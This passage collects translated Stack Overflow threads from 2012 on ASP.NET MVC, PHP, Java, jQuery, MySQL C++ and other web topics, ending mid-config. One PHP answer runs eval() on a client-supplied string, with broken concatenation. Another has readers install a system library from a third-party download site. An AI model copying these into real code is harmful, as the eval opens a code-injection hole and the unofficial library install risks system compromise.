@using (Html.BeginForm("Restore", "GlobalCrud"))
{
 @Html.Hidden("entityId", "Id")
 <input class="ui-icon ui-icon-power" type="submit" 
  onclick="return confirm('Clicking OK will restore this record');" 
 />
} 
```

这是扩展

```
public static MvcHtmlString EditOrDelete(this HtmlHelper html)
{
  var s = html.BeginForm();
  return MvcHtmlString.Create(s + " additional fields " + "</form>");
} 
```

这是用途：

```
@using namespace.CustomHelper
@Html.EditOrDelete() 
```

这是输出：

```
<form method="post" action="/Completed/Manage">
System.Web.Mvc.Html.MvcForm additional fields 
</form> 
```

大多数情况下，辅助扩展产生了我需要的东西。但是，我不确定如何将其转换回正确的 html 字符串。返回包含`System.Web.Mvc.Html.MvcForm`在文本中。为了简洁起见，我在`" additional fields "`这里添加，因为那里没有问题。添加`</form>`是因为我知道附带的正常`using`语句会在处理时`@Html.BeginForm()`添加`</form>`标签。

如何正确返回由生成的表单`.BeginForm`？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-13T21:58:08.133

```
public static class HtmlExtensions
{
    public static void EditOrDelete(this HtmlHelper html)
    {
        using (html.BeginForm())
        {
            html.ViewContext.Writer.Write("additional fields");
        }
    }
} 
```

接着：

```
@using namespace.CustomHelper
@{Html.EditOrDelete();} 
```

发出：

```
<form action="/" method="post">additional fields</form> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T21:53:34.757

调用`BeginForm`会呈现表单标记，因此您无需执行任何操作，只需调用该方法即可。

 ~~~~```
public static MvcHtmlString EditOrDelete(this HtmlHelper html)
{
    using(html.BeginForm())
    {
        return MvcHtmlString.Create(" additional fields ");
    }
} 
```~~  ~~using 语句将导致`.Dispose()`在方法返回之前被调用，导致字符串写入关闭表单标记之后。`html.ViewContext.Writer.Write`使用代替将字符串写入响应。（见[达林迪米特洛夫的回答](https://stackoverflow.com/a/10148848/21461)）

将调用包装在 using 将自动导致结束表单标记在`Dispose`被调用时也被呈现。~~~~

# java - 有没有类似 Codecademy for Java 的东西

> ID：10148746
> 
> 赞同：56
> 
> 时间：2012-04-13T21:47:24.377
> 
> 标签：java

有人知道像[Codecademy](http://www.codecademy.com)这样专注于教授 Java 编程的网站吗？（Codeacademy.com 使用 JavaScript、HTML 和 CSS 以及 Python 的指导课程）

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-04-13T23:44:22.450

看看[CodingBat](http://codingbat.com/)！它确实帮助我学习了 Java（尽管当时它曾经是 JavaBat）。这很像 Codecademy。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-13T22:05:31.437

查看 javapassion，[他们有许多包含网络编程的课程](http://www.javapassion.com/portal/web-programming-basics-with-passion/web-programming-basics-with-passion)，并且是免费的（直到情况合谋使网站需要支持自己）。

即使是象征性的费用，你一整年都会得到*很多。*与您将要投资的时间相比，这是一笔划算的交易。

其他选项是查看 Oracle 的在线教程，它们没有 Codeacademy 的浮华，但出奇的好。我还没有读过关于 Web 编程的文章，它可能嵌入在 Java EE 教程中，它不适合 Java 新手。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-13T21:51:52.943

截至目前，我不知道任何。看来代码学院的人已经在 Ruby on Rails 上设置了他们的网站。然而，他们[并不排除 Java](http://blog.codeacademy.org/post/9556209193/will-you-ever-have-a-code-academy-for-c-or-java)。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-13T21:59:23.343

Compilr 似乎正朝着这个方向发展：[http ://compilr.com/teachers](http://compilr.com/teachers)

# php - 如何使用存储为字符串的输入字段名称作为 php 数组索引

> ID：10148758
> 
> 赞同：1
> 
> 时间：2012-04-13T21:48:56.147
> 
> 标签：php

我有一个通过 ajax 函数传递给我的字段名称，我需要使用它来查找现有数组中的值。例如

```
$myarray = array(
    'name' => array(
        '0' => array(
            'first' => 'Steve'
        )
    ),
);

$incoming = 'name[0][first]'; 
```

因此，使用 $incoming 变量我想从数组中获取相应的数据，但无法弄清楚如何将字符串转换为数组索引查找。

我试图想出一种不管数组中嵌套级别如何都可以工作的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:55:51.660

## 建议 #1

[更改 jQuery 以将请求作为 JSON 发送，可以立即使用json_decode](http://us.php.net/manual/en/function.json-decode.php)将其转换为 PHP 数组。

## 建议#2

如果您无法切换到 JSON，请使用[preg_split](http://us.php.net/manual/en/function.preg-split.php)拆分传入字段并遍历它们以获取正确的数组元素。类似于以下内容：

```
$incoming = 'name[0][first]';

$parts = preg_split('/(\[|\])/', $incoming, null, PREG_SPLIT_NO_EMPTY);

$el = $myarray;
foreach ($parts as $part) {
    $el = $el[$part];
}

echo $el; // Steve 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T22:01:34.273

假设总是有 3 个或更少的键，这将起作用。您可以添加“$keyX” vars 和“if($numkeys == X)” 来表示数组的大小，但我找不到更灵活的修复方法

```
$incoming = 'name[0][first]';

$numkeys =  preg_match_all('/[\[]/', $incoming, $matches) + 1;

$split = preg_split('/[[\]]/', $incoming);
$key1 = $split[0];
$key2 = $split[1];
$key3 = $split[3];

if($numkeys == 1) {
echo $myarray[$key1];
} elseif ($numkeys == 2) {
echo $myarray[$key1][$key2];
} elseif ($numkeys == 3) {
echo $myarray[$key1][$key2][$key3];
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T22:03:23.697

你可以使用 eval 函数......即使这是非常不推荐的 - 特别是当你为客户端获取字符串时（如果我理解的话）

```
 $incoming = 'name[0]["first"]';
 eval('$value = $'+$incoming+';');
 echo $value; 
```

此脚本应打印数组中特定单元格的数据...

再次 - 除非您确保输入是您期望的格式，否则不建议这样做...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T22:10:16.723

尝试在这里使用explode函数，在你的例子中 - name[0][first] 将给出一个数组 - (name, 0] , first] ) 作为列表/数组，在你在'['上爆炸之后。丢弃第一个元素，然后从其余元素中取出 ']' 部分。稍后您可以将它们转换为相应的格式 - 整数、字符串等。

# java - 调用“连接”时的 Java 套接字方法块

> ID：10148762
> 
> 赞同：0
> 
> 时间：2012-04-13T21:49:28.010
> 
> 标签：java, sockets

在回答之前，请注意这是客户端问题，而不是服务器问题。由于我在终端使用 telnet 连接到服务器，并且 telnet 能够连接到服务器。现在，我不知道为什么connect方法无法连接我同时使用了本地主机地址和服务器的私有IP地址。它只是阻塞并且它从不调用回调方法。

```
 client.connect(new InetSocketAddress(hostname, 1993));
                callback.onConnection(); // Never invokes!
                OutputStream writer = client.getOutputStream();
                InputStream reader = client.getInputStream();
                byte[] buffer = new byte[1024 * 1024]; 
```

PS我是不是做错了什么。这不可能是防火墙问题，因为 telnet 能够连接到服务器，而且我认为我没有防火墙，因为我在我的 Ubuntu 机器上运行此代码。服务器和客户端都使用 TCP 协议，客户端和服务器端都没有抛出异常。任何关于可能出错的建议都非常有用。我可以显示更多代码，例如服务器代码。服务器是用 C++ 编写的，客户端是用 Java 编写的。

编辑：

我终于能够建立连接。我没有使用连接方法，而是使用套接字的构造函数来调用连接。我不知道为什么连接不起作用？

下面是代码修改：

```
 client = new Socket(hostname, port);
            callback.onConnection();
            OutputStream writer = client.getOutputStream();
            InputStream reader = client.getInputStream();
            byte[] buffer = new byte[1024 * 1024];
            reader.read(buffer); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T22:04:02.187

我想你正在使用阻塞套接字，所以`connect`方法将阻塞执行，直到建立连接。例如，您可以尝试使用[http://docs.oracle.com/javase/1.4.2/docs/api/java/nio/channels/SocketChannel.html](http://docs.oracle.com/javase/1.4.2/docs/api/java/nio/channels/SocketChannel.html)创建非阻塞套接字

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T22:06:17.923

您是否尝试在调用 connect 之前检查地址上的 isUnresolved() ？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T22:19:54.813

我终于能够建立连接。我没有使用连接方法，而是使用套接字的构造函数来调用连接。我不知道为什么连接不起作用？

下面是代码修改：

```
 client = new Socket(hostname, port);
        callback.onConnection();
        OutputStream writer = client.getOutputStream();
        InputStream reader = client.getInputStream();
        byte[] buffer = new byte[1024 * 1024];
        reader.read(buffer); 
```

# jquery - 为什么我需要在 WordPress 中为内联 JS 包含外部 jQuery 库？

> ID：10148763
> 
> 赞同：-2
> 
> 时间：2012-04-13T21:49:46.923
> 
> 标签：jquery, wordpress

我对 jQuery 在 Wordpress 中的工作方式感到非常困惑。对不起，如果我漫无目的——很难以简洁的方式问。我认为这里有一个“深层概念”，我想一劳永逸地进行分类。

如果我创建一个简单的基于 jQuery 的插件，代码执行得很好，使用 WordPress 自动加载的 jQuery 库，只要我在无冲突模式下使用它，甚至只使用 jQuery 而不是 $。

但是如果我为给定的主题创建一个 php 模板，我就不能在那个 php 页面上使用 jQuery。只是不会“开火”。我认为这是因为 js 出现在 WP_Header 之后。

但是........如果我在该页面上排队 jQuery.1.3.2，那么我神奇地 - 不仅可以在该页面上使用 jQuery，还可以使用 $ 语法。

所以我的问题是：怎么会？

编辑：转到[http://burtengineering.com/contact-us](http://burtengineering.com/contact-us)

如果您查看@源代码，我有一个包含的 jquery1.3.2，它仅允许内联 js 触发。

```
<script type="text/javascript">
jQuery(document).ready(function() {
    jQuery('body').prepend('<div id="popup"><h4>Processing</h4><div id="inner"><p>One moment, please.</p></div></div>');
});
</script> 
```

如果我不包含该脚本，则该 js 将无法工作，即使 WordPress 已经包含 jquery 1.7。

再说一次，我的问题是：我做错了什么阻止了内联 js 工作。而且，为什么我不能在我的 jQuery 中使用 $，除非我包含那个 jquery 1.3.2？

谢谢，

由于某种原因，我没有看到“添加评论”按钮。

---JC

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T10:35:12.713

看看[这个。](http://digwp.com/2009/06/including-jquery-in-wordpress-the-right-way/)

你有正确的头文件吗？

# asp.net - 局部视图和登录时与模型冲突

> ID：10148766
> 
> 赞同：2
> 
> 时间：2012-04-13T21:50:12.197
> 
> 标签：asp.net, asp.net-mvc, razor

传入字典的模型项的类型为“System.Collections.Generic.List`1[PM.Models.Product]”，但此字典需要“PM.Models.LogOnModel”类型的模型项。

问题：

```
Ошибка сервера в приложении '/'.
The model item passed into the dictionary is of type 'System.Collections.Generic.List`1[PM.Models.Product]', but this dictionary requires a model item of type 'PM.Models.LogOnModel'. 
 Описание: Необработанное исключение при выполнении текущего веб-запроса. Изучите трассировку стека для получения дополнительных сведений о данной ошибке и о вызвавшем ее фрагменте кода. 

 Сведения об исключении: System.InvalidOperationException: The model item passed into the dictionary is of type 'System.Collections.Generic.List`1[PM.Models.Product]', but this dictionary requires a model item of type 'PM.Models.LogOnModel'.

Ошибка источника: 

Строка 1:  @using PM.Models
Строка 2:  @{PM.Models.LogOnModel LOM=new LogOnModel();}
Строка 3:  @RenderPage("../Account/LogOn.cshtml"); 
```

我尝试在主页上使用一个 PartialView 来查看用户字段的登录名和密码以在站点登录。另一个部分视图用于在站点上显示给用户的产品列表。但是我有问题，请帮帮我。

这是我的登录页面的示例

```
@model PM.Models.LogOnModel
@{
    ViewBag.Title = "Log On";
}
<script src="@Url.Content("~/Scripts/jquery.validate.min.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.validate.unobtrusive.min.js")" type="text/javascript"></script>
<script type="text/javascript" language="javascript">
    var UserNameTextBox = document.getElementById("login");
    UserNameTextBox.textContent = UserNameTextBox.textContent + "123";
</script>

<link href="../../Content/themes/our/Style.css" rel="stylesheet" type="text/css" />

@using (Html.BeginForm("LogOn", "Account"))
{      
   <div id="login" >
    @Html.TextBoxFor(m => m.UserName, new { @class = "inputLogin" })
    @Html.PasswordFor(m => m.Password, new { @class = "inputLogin" })
    @Html.CheckBoxFor(m => m.RememberMe)
    @Html.LabelFor(m => m.RememberMe, new { @class = "rememberText" })
    <div id="ErrorMessage">
    @Html.ValidationSummary(true, "Авторизоваться не удалось, проверьте введенные данные.")
    </div>

     <div id="loginButtons">
            @Html.ActionLink(" ", "Register", "Account", routeValues: null, htmlAttributes: new { id = "registerLink", @class = "register" })
            <input type="submit" value="Войти" id="loginButton" title="Войти" />
        </div>
    <div id="loginWith">
        Войти через: &nbsp;&nbsp;&nbsp;
        <a href="" style="text-decoration:none;"><img alt="" class="SocialIcon" src="../../Content/img/VKicon.PNG" />&nbsp;&nbsp;&nbsp;&nbsp;</a>
        <a href="" style="text-decoration:none"><img alt="" class="SocialIcon" src="../../Content/img/FBIcon.PNG" />&nbsp;&nbsp;&nbsp;</a>
        <a href="" style="text-decoration:none"><img alt="" class="SocialIcon" src="../../Content/img/TwitterIcon.PNG" /></a>
    </div>
   </div>

} 
```

这是我的搜索页面的示例，它需要 LogOn 的另一个模型

```
@model IEnumerable<PM.Models.Product>

<p>
    @Html.ActionLink("Create New", "Create")
</p>
<table>
    <tr>
        <th>
            @Html.DisplayNameFor(model => model.Name)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.Description)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.Type)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.Image)
        </th>
        <th>
            @Html.DisplayNameFor(model => model.Partition)
        </th>
        <th></th>
    </tr>

@foreach (var item in Model) {
    <tr>
        <td>
            @Html.DisplayFor(modelItem => item.Name)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.Description)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.Type)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.Image)
        </td>
        <td>
            @Html.DisplayFor(modelItem => item.Partition)
        </td>
        <td>
            @Html.ActionLink("Edit", "Edit", new { id=item.Id }) |
            @Html.ActionLink("Details", "Details", new { id=item.Id }) |
            @Html.ActionLink("Delete", "Delete", new { id=item.Id })
        </td>
    </tr>
}

</table> 
```

帐户管理员

```
 [AllowAnonymous]
        public ActionResult LogOn()
        {
            string actionName = ControllerContext.RouteData.GetRequiredString("action");
            ViewBag.FormAction = actionName;
            return View();
        }

        //
        // POST: /Account/LogOn

        [AllowAnonymous]
        [HttpPost]
        public ActionResult LogOn(LogOnModel model, string returnUrl)
        {
            if (ModelState.IsValid)
            {
                if (System.Web.Security.Membership.ValidateUser(model.UserName, model.Password))
                {
                    FormsAuthentication.SetAuthCookie(model.UserName, model.RememberMe);
                    if (Url.IsLocalUrl(returnUrl))
                    {
                        return Redirect(returnUrl);
                    }
                    else
                    {
                        if (Request.UrlReferrer != null)
                            return Redirect(Request.UrlReferrer.AbsoluteUri);
                        else
                        {
                            return RedirectToAction("Index","Home");
                        }
                    }
                }
                else
                {
                    ModelState.AddModelError("", "The user name or password provided is incorrect.");
                }
            }

            // If we got this far, something failed, redisplay form
            return RedirectToAction("Index", "Home", new { login = "incorrect" });
        } 
```

与搜索视图一起使用的控制器

```
[HttpGet]
    public ActionResult Search(string KeyWord)
    {
        DataManager dm = new DataManager();
        List<Product> sended = dm.FindProducts(KeyWord);
        return View(sended);
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-14T06:28:08.820

因此，您有 2 个局部视图 LogOn.cshtml 和 Search.cshtml 分别强输入到`LogOnModel`和`IEnumerable<Product>`。这意味着您需要在渲染这些部分时传递正确的模型类型。例如，如果您只使用`Html.Partial("somePartial")`而不指定模型作为第二个参数，则将传递父模型。如果要指定模型，可以执行以下操作：

```
@{
    var logonModel = new LogOnModel();
}
@Html.Partial("~/Views/Account/LogOn.cshtml", logonModel) 
```

或者您可以使用[Html.Action](http://haacked.com/archive/2009/11/18/aspnetmvc2-render-action.aspx)帮助器，而不是直接包含部分视图，而是允许您调用将返回部分视图的控制器操作。但是没有从客户端发送单独的 HTTP 请求。所有都发生在同一个请求中：

```
@Html.Action("LogOn", "Account") 
```

现在将调用您的 LogOn 方法，并且必须通过正确的模型：

```
public ActionResult LogOn()
{
    var model = new LogOnModel();
    return PartialView(model);
}

[HttpPost]
public ActionResult LogOn(LogOnModel model, string returnUrl)
{
    ...
} 
```

搜索部分也是如此：

```
@Html.Action("Search", "SomeControllerContainingTheSearchAction") 
```

# javascript - VirtualBox 限制 .js 文件的大小，可以从共享文件夹中包含吗？

> ID：10148769
> 
> 赞同：3
> 
> 时间：2012-04-13T21:50:19.123
> 
> 标签：javascript, virtualbox

*这个问题可能属于超级用户，但无论如何我都会尝试在这里问它，因为我相信，一些 Web 开发人员可能会遇到这种奇怪的行为。*

* * *

在 VirtualBox 上测试网站的 IE8/winXP 兼容性时，我遇到了一个奇怪的问题`$ is undefined`，这是由于不包含 jQuery（和 jQuery UI）引起的，当被解析为`file:///`url 的相对路径引用时。似乎是因为它们的大小太大（超过 200KB）。

只需将这两个大文件的链接替换为那些链接就可以`http://`解决我的问题。

但这里有一个问题：**为什么会发生这种情况？**

是配置错误吗？一个错误？一个已知的设计决策？

* * *

细节：

*   *虚拟盒子 4.1.8*
*   *主机操作系统：win7 64 位，客户操作系统：xp sp3 32 位*
*   *已安装来宾添加，页面从 VB 共享文件夹启动*
*   *该错误在所有浏览器中都表现出来（即使在歌剧中，它忽略了即安全设置，afaik）*
*   *ie配置是默认的*
*   *脚本是这样包含的*：`<script type="text/javascript" src="js/libs/jquery/jquery-1.7.2.js">`
*   *未扣除确切的尺寸限制。*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T23:24:30.773

第一个问题：IE 在加载这个 HTML 文件时使用什么区域？查看 IE 窗口的右下角是否有“我的电脑”或“本地 Intranet”之类的内容。尽管这个问题出现在其他浏览器中，但我很想知道 IE 将您的共享文件夹视为什么。

这听起来更像是浏览器问题，而不是 VirtualBox 在做一些有趣的事情。如今，IE 对 file:// URI 的限制非常严格，其他浏览器在不同程度上也是如此……

其他 .js 文件在相关页面中加载是否正常，或者它们是否也被阻止？更小得多的旧版本的 jQuery（如 v1.3.2）呢？

您是否出于某种原因从文件共享而不是从 Web 服务器加载它们？如果将所有文件从共享驱动器复制到来宾 c:\ 驱动器，是否会得到相同的结果？

升级到 VirtualBox 4.1.12 怎么样？我怀疑它会有所作为，但它可能值得一试。

最后一个想法是 jQuery 有一些调用可能会触发 IE（可能还有其他）阻止脚本 - 特别是调用`new ActiveXObject`. 也许创建一个小的 .js 文件来尝试将其作为问题解决。沿着同样的思路——如果你创建一个垃圾，虽然合法的 .js 文件很大——比如 400K，会发生什么：

```
var a = "... really, really long string";
var b = "... another really long string";
... 
```

# c++ - MySQL 连接器 C++ - 指针无效

> ID：10148773
> 
> 赞同：4
> 
> 时间：2012-04-13T21:50:40.990
> 
> 标签：c++, mysql, mysql-connector

我正在尝试使用 MySQL C++ 连接器连接到数据库。我已经添加了库，并且源代码使用所有必要的#include 语句正确编译。我正在使用的代码如下：

```
#include <stdlib.h>
#include <iostream>

#include "mysql_connection.h"

#include <cppconn/driver.h>
#include <cppconn/exception.h>
#include <cppconn/resultset.h>
#include <cppconn/statement.h>

using namespace std;

int main(void)
{
    using namespace sql;

    Driver *driver;
    Connection *con;

driver = get_driver_instance();
con = driver -> connect("tcp://127.0.0.1:3306/test", "test", "test");
} 
```

代码取自示例，应该可以正常工作。我已经显着缩短了代码，因为它位于引发错误的最终“驱动程序->连接”行。我的错误信息如下：

```
*** glibc detected *** /home/username/NetBeansProjects/mysql/dist/Release/GNU-Linux-x86/mysql:
free(): invalid pointer: 0x091dd468 *** 
```

我在 Linux Mint Lisa 上，运行最新版本的 MySQL 并使用 NetBeans 7.1 作为 IDE。如前所述，代码编译正确，并且发生在最后一条连接线上。对于其他连接机制的任何帮助或建议将不胜感激。

* * *

更新

这是定义连接的 Driver 类的代码

```
class CPPCONN_PUBLIC_FUNC Driver
{
protected:
virtual ~Driver() {}
public:
// Attempts to make a database connection to the given URL.

virtual Connection * connect(const sql::SQLString& hostName, const sql::SQLString& userName, const sql::SQLString& password) = 0;

virtual Connection * connect(ConnectOptionsMap & options) = 0;

... 
```

那里没什么可看的……以我的拙见……

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-12T10:40:30.047

我已经为 Ubuntu 12.04 找到了解决这个问题的方法，我花了大约 48 小时没有睡觉，但是好的，就这样吧。我确信此修复程序适用于其他版本的 Ubuntu。[从http://www.sopcast.com/download/libstdcpp5.tgz](http://www.sopcast.com/download/libstdcpp5.tgz)下载 libstdc++.so.5 。您需要提取文件并将其放在 /usr/lib 中。

确保在使用 g++ 构建应用程序时添加 -llibstdc++.so.5（此链接 stdc++ v5）

然后谷歌“Connector c++ Ubuntu 12.04”并寻找构建并为你的 Arch 下载 .deb。

对于 Ubuntu 12.04，这里是 .debs 的 URL [https://launchpad.net/ubuntu/precise/+source/mysql-connector-c++/+builds](https://launchpad.net/ubuntu/precise/+source/mysql-connector-c++/+builds) 选择你的架构，即。Amd64 并下载 Built Files 下的两个 .debs。使用包管理器打开并安装。您现在应该能够在没有问题的情况下运行您的应用程序。

**编辑** 您不需要链接 libstdc++.so.5，您可能必须在您的系统上，但在 Ubuntu 12.04 amd64 上不需要。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-11T19:40:48.810

让您的 C++ 程序在 2 分钟内与 MySQL 对话！

注意：这适用于带有 MySQL（典型 LAMP 设置）的 Ubuntu 12.04 服务器（AWS EC2），不保证向后兼容性。

要从 C++ 程序访问 MySQL 数据库，您必须首先使用以下命令行安装一些 mysql 库文件

```
sudo apt-get install libmysqlclient-dev 
```

在您将保存的同一目录中保存一个名为“mysql_config”的配置文件（并运行您的应用程序 - 让我们说“/temp”）

```
mysql_config --cflags
-I/usr/include/mysql  -DBIG_JOINS=1  -fno-strict-aliasing   -DUNIV_LINUX
mysql_config --libs
-Wl,-Bsymbolic-functions -rdynamic -L/usr/lib/mysql -lmysqlclient 
```

编译你的 c++ 文件“myapp.cpp”，用

```
sudo g++ -o myapp $(mysql_config --cflags) myapp.cpp $(mysql_config --libs) 
```

基于这个由[Coding Friends编写的](http://www.codingfriends.com/index.php/about-me/)[优秀功能示例](http://www.codingfriends.com/index.php/2010/02/17/mysql-connection-example/)

# javascript - 将 Javascript 中的数字 Aatch 更改为接受点

> ID：10148774
> 
> 赞同：0
> 
> 时间：2012-04-13T21:50:48.373
> 
> 标签：javascript, validation

现在，我正在使用它来检查某个值是否为数字：

```
(variable.match(/^[\d]*$/ )) 
```

我怎样才能修改该代码，使其接受“。” 或期间。我查看了其他网站，似乎找不到任何可以让它接受“。”的东西。不接受信件。答案不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:53:43.093

`(variable.match(/^[\d]*(\.\d+)?$/ ))` 这将接受带或不带点的数字......但如果有一个点 - 后面必须有一个数字

这些字符串都是有效的：01、12.3、.23、12、.3 ....

此字符串无效：12.（带点）、1.1.1

希望我帮助...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:54:41.617

这也可以，但它不需要点后的数字（取决于您的要求）

```
(variable.match(/[0-9]+\.?([0-9]+?)?/)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T21:57:07.353

首先，那个正则表达式会让你失败，因为它会匹配一个空字符串。

但是，如果您想匹配数字和句点（而不是空字符串），请执行以下操作：

```
(variable.match(/^[\d.]+$/)) 
```

请注意，这将匹配以下内容：

```
`1234.234.34....1234..3` 
```

如果您的要求不允许这样做，请向我们提供有关您的要求的更多信息。

干杯

# javafx-2 - JavaFX setCursor 立即显示

> ID：10148777
> 
> 赞同：2
> 
> 时间：2012-04-13T21:50:53.813
> 
> 标签：javafx-2

我需要在拖动时更改光标，并希望在立即按下鼠标后更改它，所以我这样做：

```
public class Graph extends Pane{

 void someInit(){

    setOnMousePressed(new EventHandler<MouseEvent>() {

            @Override
            public void handle(MouseEvent e) {
                logger.info("pressed graph x-> " + e.getX() + " |  y->" + e.getY());
                setCursor(Cursor.MOVE);
            }
        });
 }

} 
```

按下鼠标按钮并且不移动任何像素后，光标不会改变。它在最小的鼠标移动后发生变化。如何在不移动鼠标的情况下强制立即显示它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-26T17:23:02.633

通过 CSS 更改时，光标会立即更新，例如：

```
.moving {
    -fx-cursor: closed_hand;
} 
```

然后您的代码可能如下所示：

```
public class Graph extends Pane{
    void someInit() {
        setOnMousePressed(new EventHandler<MouseEvent>() {
            @Override
            public void handle(MouseEvent e) {
                logger.info("pressed graph x-> " + e.getX() + " |  y->" + e.getY());
                Graph.this.getStyleClass().add("moving");
            }
        });
    }
} 
```

您可以稍后在另一个事件中使用以下方法恢复光标：

```
getStyleClass().remove("moving"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-20T14:34:50.400

这是 JavaFX 中的一个错误，已在 8 中修复。

[https://javafx-jira.kenai.com/browse/RT-33412](https://javafx-jira.kenai.com/browse/RT-33412)

# javascript - 带有 RequireJS 的持久/可访问的 BackboneJS 模型

> ID：10148778
> 
> 赞同：2
> 
> 时间：2012-04-13T21:51:07.783
> 
> 标签：javascript, model-view-controller, backbone.js, requirejs

我正在尝试找出解决问题的“最佳实践”解决方案，而我在使用 RequireJS 和 BackboneJS 构建 Web 应用程序时遇到了问题。

我的应用程序需要（在启动时或之后不久）清理服务以获取其大部分数据，然后解析该数据。

显然，我希望我的模型获取数据并将其解析（到多个子模型中），但我有点绊脚石的是如何让我的模型保持持久性。BackboneJS 让人感觉模型应该使用 View 即时实例化，但这在我的场景中不起作用。

此外，由于 RequireJS 将所​​有内容隔离到全局命名空间之外的模块中，我正在努力使我的持久模型可用于我的视图 - 我应该只使用单例模式吗？如果是这样，是否有关于如何避免使用 RequireJS 的循环依赖问题的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-16T15:58:10.550

您可以在视图之外创建长寿命模型并将它们传入：

```
var view = new MyView({model: theModelInstance}); 
```

当您摆脱视图时，您需要记住取消所有可能阻止视图被垃圾收集的事件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-28T13:11:17.613

我对此的解决方案是创建一个模块，该模块创建一个简单的对象，我用 require.js 将它传递给我的所有其他模块。

例如，创建 yourobject.js 并将其包含在所有模块中。在 yourobject.js 中，只需创建并返回一个对象。

```
# coffeescript
define [], () ->
  YourObj = 
    # you can put all kinds of things in here or just leave it empty
    init: ->
      # i usually put my app init/backbone bootstrapping code 
      # here then call it in the app module

  # and return it
  YourObj 
```

然后只需将此模块包含在任何其他模块中，您就可以使用 YourObj 就好像它是一个全局对象（在某种意义上）。您可以将实例化的主干视图保存到它，主干路由器以供将来操作......无论您喜欢什么。

> RequireJS 将所​​有内容隔离到全局命名空间之外的模块中

只需将 RequireJS 视为为您的代码提供了一个很好的保护伞。RequireJS 没有全局命名空间污染，但这并不能阻止您像传递全局对象一样传递这样的对象。希望这能澄清一点！

# php - 将 PHP 转换为 ASP？

> ID：10148779
> 
> 赞同：0
> 
> 时间：2012-04-13T21:51:40.787
> 
> 标签：php, asp.net

我有一个使用 3 个 PHP 文件的模板。

connector-fileimport.php connector-icon.php elFinder.class.php

是否可以将这些转换为 asp.net？

连接器文件import.php

```
<?php

error_reporting(0); // Set E_ALL for debuging

if (function_exists('date_default_timezone_set')) {
    date_default_timezone_set('Europe/Moscow');
}

include_once dirname(__FILE__).DIRECTORY_SEPARATOR.'elFinder.class.php';

/**
 * Simple example how to use logger with elFinder
 **/
class elFinderLogger implements elFinderILogger {

    public function log($cmd, $ok, $context, $err='', $errorData = array()) {
        if (false != ($fp = fopen('./log.txt', 'a'))) {
            if ($ok) {
                $str = "cmd: $cmd; OK; context: ".str_replace("\n", '', var_export($context, true))."; \n";
            } else {
                $str = "cmd: $cmd; FAILED; context: ".str_replace("\n", '', var_export($context, true))."; error: $err; errorData: ".str_replace("\n", '', var_export($errorData, true))."\n";
            }
            fwrite($fp, $str);
            fclose($fp);
        }
    }

}

$opts = array(
    'root'            => '../../../../examfilemanager/',                       // path to root directory
    'URL'             => "examfilemanager/", // root directory URL
    'rootAlias'       => 'Home',       // display this instead of root directory name
    //'uploadAllow'   => array('images/*'),
    //'uploadDeny'    => array('all'),
    //'uploadOrder'   => 'deny,allow'
    // 'disabled'     => array(),      // list of not allowed commands
    // 'dotFiles'     => false,        // display dot files
    // 'dirSize'      => true,         // count total directories sizes
    // 'fileMode'     => 0666,         // new files mode
    // 'dirMode'      => 0777,         // new folders mode
    // 'mimeDetect'   => 'internal',       // files mimetypes detection method (finfo, mime_content_type, linux (file -ib), bsd (file -Ib), internal (by extensions))
    // 'uploadAllow'  => array(),      // mimetypes which allowed to upload
    // 'uploadDeny'   => array(),      // mimetypes which not allowed to upload
    // 'uploadOrder'  => 'deny,allow', // order to proccess uploadAllow and uploadAllow options
    // 'imgLib'       => 'mogrify',       // image manipulation library (imagick, mogrify, gd)
    // 'tmbDir'       => '.tmb',       // directory name for image thumbnails. Set to "" to avoid thumbnails generation
    // 'tmbCleanProb' => 1,            // how frequiently clean thumbnails dir (0 - never, 100 - every init request)
    // 'tmbAtOnce'    => 5,            // number of thumbnails to generate per request
    // 'tmbSize'      => 48,           // images thumbnails size (px)
    // 'fileURL'      => true,         // display file URL in "get info"
    // 'dateFormat'   => 'j M Y H:i',  // file modification date format
    // 'logger'       => null,         // object logger
    // 'defaults'     => array(        // default permisions
    //  'read'   => true,
    //  'write'  => true,
    //  'rm'     => true
    //  ),
    // 'perms'        => array(),      // individual folders/files permisions    
    // 'debug'        => true,         // send debug to client
    'archiveMimes' => array(),      // allowed archive's mimetypes to create. Leave empty for all available types.
    // 'archivers'    => array()       // info about archivers to use. See example below. Leave empty for auto detect
     'archivers' => array(
        'create' => array(
            'application/x-gzip' => array(
                'cmd' => 'tar',
                'argc' => '-czf',
                'ext'  => 'tar.gz'
                )
            ),
        'extract' => array(
